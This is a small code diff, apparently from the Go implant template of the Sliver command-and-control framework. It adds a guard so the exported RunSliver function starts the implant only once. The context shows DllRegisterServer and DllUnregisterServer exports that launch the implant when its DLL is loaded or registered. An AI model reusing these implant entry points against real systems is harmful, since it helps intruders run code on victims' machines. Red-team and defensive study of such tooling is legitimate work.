@@ -47,10 +47,15 @@ import (
 
 // {{if .IsSharedLib}}
 
+var isRunning bool = false
+
 // RunSliver - Export for shared lib build
 //export RunSliver
 func RunSliver() {
-	main()
+	if !isRunning {
+		isRunning = true
+		main()
+	}
 }
 
 // Thanks Ne0nd0g for those
@@ -74,7 +79,6 @@ func DllRegisterServer() { main() }
 // https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
 //export DllUnregisterServer
 func DllUnregisterServer() { main() }
-
 
 // {{end}}
 
